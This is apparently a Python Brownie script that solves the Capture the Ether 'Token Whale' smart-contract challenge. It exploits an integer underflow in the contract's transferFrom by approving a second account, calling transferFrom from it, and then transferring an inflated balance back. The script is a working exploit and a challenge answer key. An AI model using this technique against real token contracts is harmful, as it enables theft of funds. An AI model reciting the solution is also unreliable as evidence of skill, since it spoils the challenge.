from lib2to3.pgen2 import token
from scripts.helper.utils import *
from scripts.helper.account import _from, acc, _from2, acc2
from brownie import TokenWhaleChallenge

##########################################
# This ERC20-compatible token is hard to acquire. There’s a fixed supply of 1,000 tokens, all of which are yours to start with.
# Find a way to accumulate at least 1,000,000 tokens to solve this challenge.
#########################################

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        token_whale = load_challenge(ContractObject=TokenWhaleChallenge, instance_key='token_whale')
    else:
        token_whale = deploy_locally(ContractObject=TokenWhaleChallenge, from_account=_from, constructor_params=[acc.address])
    
    # send ether to acc2
    acc.transfer(acc2.address, 1e17)

    # approve acc2 to spend 1e18 tokens of acc
    token_whale.approve(acc2, 1e50, _from)

    # transferfrom call from acc2
    token_whale.transferFrom(acc.address, acc.address, 1e3, _from2)

    # try something out
    token_whale.transfer(acc.address, 1e7, _from2)

    # print balances
    print(f'{acc.address} balance: {token_whale.balanceOf(acc.address)}')
    print(f'{acc2.address} balance: {token_whale.balanceOf(acc2.address)}')

    # check if the challenge is solved
    result = token_whale.isComplete()
    print(result)

    # return the result
    return result

def main():
    solve_challenge()
